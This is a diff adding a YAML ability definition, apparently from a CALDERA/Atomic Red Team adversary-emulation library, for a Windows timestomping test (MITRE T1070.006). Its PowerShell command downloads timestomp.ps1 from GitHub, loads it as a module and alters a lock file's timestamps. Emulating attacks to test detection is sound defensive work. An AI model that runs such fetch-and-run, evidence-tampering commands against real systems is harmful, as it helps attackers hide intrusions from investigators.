@@ -1,0 +1,60 @@
+- id: d7512c33-3a75-4806-9893-69abc3ccdd43
+  name: Windows - Timestomp a File
+  description: "Timestomp kxwn.lock.\n\nSuccessful execution will include the placement\
+    \ of kxwn.lock in #{file_path} and execution of timestomp.ps1 to modify the time\
+    \ of the .lock file. \n\n[Mitre ATT&CK Evals](https://github.com/mitre-attack/attack-arsenal/blob/master/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilities/defensive-evasion/4a2ad84e-a93a-4b2e-b1f0-c354d6a41278.yml)"
+  tactic: defense-evasion
+  technique:
+    attack_id: T1070.006
+    name: 'Indicator Removal on Host: Timestomp'
+  platforms:
+    windows:
+      psh:
+        command: 'if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\timestomp.ps1")
+          {exit 0} else {exit 1}; then : ; else Invoke-WebRequest "https://raw.githubusercontent.com/mitre-attack/attack-arsenal/bc0ba1d88d026396939b6816de608cb279bfd489/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/timestomp.ps1"
+          -OutFile "PathToAtomicsFolder\..\ExternalPayloads\timestomp.ps1"; fi; if
+          (Test-Path -path "PathToAtomicsFolder\..\ExternalPayloads\kxwn.lock") {exit
+          0} else {exit 1}; then : ; else New-Item -Path "PathToAtomicsFolder\..\ExternalPayloads\kxwn.lock"
+          -ItemType File; fi; import-module "PathToAtomicsFolder\..\ExternalPayloads\timestomp.ps1";
+          timestomp -dest "PathToAtomicsFolder\..\ExternalPayloads\kxwn.lock"'
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1070.006
+  - atomic-red-team
+  - defense-evasion
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      file_path:
+        description: File path for timestomp payload
+        type: string
+        default: PathToAtomicsFolder\..\ExternalPayloads
+    dependencies:
+    - description: 'timestomp.ps1 must be present in #{file_path}.
+
+        '
+      prereq_command: 'if (Test-Path "#{file_path}\timestomp.ps1") {exit 0} else {exit
+        1}
+
+        '
+      get_prereq_command: 'Invoke-WebRequest "https://raw.githubusercontent.com/mitre-attack/attack-arsenal/bc0ba1d88d026396939b6816de608cb279bfd489/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/timestomp.ps1"
+        -OutFile "#{file_path}\timestomp.ps1"
+
+        '
+    - description: 'kxwn.lock must be present in #{file_path}.
+
+        '
+      prereq_command: 'if (Test-Path -path "#{file_path}\kxwn.lock") {exit 0} else
+        {exit 1}
+
+        '
+      get_prereq_command: 'New-Item -Path "#{file_path}\kxwn.lock" -ItemType File
+
+        '
+    technique_created: '2020-01-31T12:42:44.103Z'
+    atomic_guid: d7512c33-3a75-4806-9893-69abc3ccdd43
+    import_timestamp: '2025-06-24T11:15:00.322480Z'
